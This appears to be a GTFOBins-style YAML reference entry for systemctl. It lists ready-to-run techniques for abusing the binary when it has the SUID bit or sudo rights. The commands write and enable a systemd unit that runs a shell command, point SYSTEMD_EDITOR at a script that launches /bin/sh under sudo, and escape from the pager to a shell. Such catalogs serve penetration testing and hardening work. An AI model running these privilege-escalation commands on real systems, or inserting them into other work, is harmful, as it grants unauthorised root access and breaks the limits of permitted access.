---
functions:
  suid:
    - code: |
        mkdir -p ~/.config/systemd/user
        TF=$(mktemp -p ~/.config/systemd/user).service
        echo '[Service]
        Type=oneshot
        ExecStart=/bin/sh -c "id > /tmp/output"
        [Install]
        WantedBy=multi-user.target' > $TF
        ./systemctl link $TF
        ./systemctl enable --now $TF
  sudo:
    - code: |
        TF=$(mktemp)
        echo /bin/sh >$TF
        chmod +x $TF
        sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice
    - code: |
        mkdir -p ~/.config/systemd/user/
        TF=$(mktemp -p ~/.config/systemd/user).service
        echo '[Service]
        Type=oneshot
        ExecStart=/bin/sh -c "id > /tmp/output"
        [Install]
        WantedBy=multi-user.target' > $TF
        sudo systemctl link $TF
        sudo systemctl enable --now $TF
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        sudo systemctl
        !sh
---
